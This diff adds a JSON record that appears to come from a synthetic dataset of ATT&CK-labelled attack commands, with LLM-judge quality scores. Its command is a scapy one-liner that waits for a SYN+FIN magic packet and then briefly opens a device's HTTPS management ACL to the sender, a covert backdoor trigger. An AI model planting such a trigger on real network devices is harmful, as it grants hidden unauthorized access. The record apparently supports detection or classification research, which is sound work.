@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1205",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "sudo python3 -c 'from scapy.all import sniff,IP,TCP; import os; p=sniff(filter=\"tcp dst port 42424\", lfilter=lambda x: x.haslayer(TCP) and (x[TCP].flags & 0x03)==0x03, count=1)[0]; os.system(f\"ciscoconf --apply \\\"ip access-list extended MGMT-SF; permit tcp host {p[IP].src} any eq 443\\\" && (sleep 180; ciscoconf --apply \\\"ip access-list extended MGMT-SF; no permit tcp host {p[IP].src} any eq 443\\\") &\")'",
+  "explanation": "Uses a SYN+FIN packet to TCP/42424 as a magic signal to temporarily open HTTPS management (TCP/443) to the sender via ciscoconf for 3 minutes. Requires sudo for sniffing.",
+  "rationale_steps": [
+    "Filter for unusual TCP flag combination (SYN+FIN) to a high port as the covert trigger.",
+    "Permit TCP/443 from the source IP in an ACL and revoke after 180 seconds.",
+    "No auth changes are made; only access gating is manipulated.",
+    "Detection: IDS rule for SYN+FIN to 42424 and monitoring of transient 443 ACL entries."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-7a393370-ceeb8eaa",
+  "source_prompt_hash": "7a393370",
+  "timestamp_utc": "2025-09-30T06:01:37.763989Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command is properly quoted and parenthesized; the Python one-liner parses, f-string escaping is correct, and shell operators/grouping are valid.",
+        "semantic_score": 4,
+        "semantic_justification": "It uses Scapy to sniff a magic SYN+FIN packet on TCP/42424 and triggers a timed ACL change via ciscoconf, aligning with traffic signaling, though the SYN+FIN trigger and ciscoconf/ACL semantics are environment-dependent.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T16:09:39.173944Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is largely well-formed with balanced quotes and parentheses, though the nested quoting with escaped inner quotes in the f-string shell invocation is complex and could fail in some shell environments depending on quote handling.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly implements a port-knocking/traffic-signaling pattern using a SYN+FIN magic packet (flags 0x03) on a non-standard port to trigger a temporary ACL change via ciscoconf, which is a plausible T1205 implementation, though 'ciscoconf' is a fictional/non-standard tool and the SYN+FIN combination is technically invalid per TCP spec, slightly reducing operational realism.",
+        "combined_score": 4.0,
+        "confidence": 0.82,
+        "timestamp": "2026-02-19T03:54:57.096654Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using correct Python syntax, proper escaping for nested shell commands, and valid Scapy function calls.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements Traffic Signaling (T1205) by listening for a specific TCP flag combination (SYN+FIN) to trigger a temporary security policy change on a network device.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-19T03:55:01.153251Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
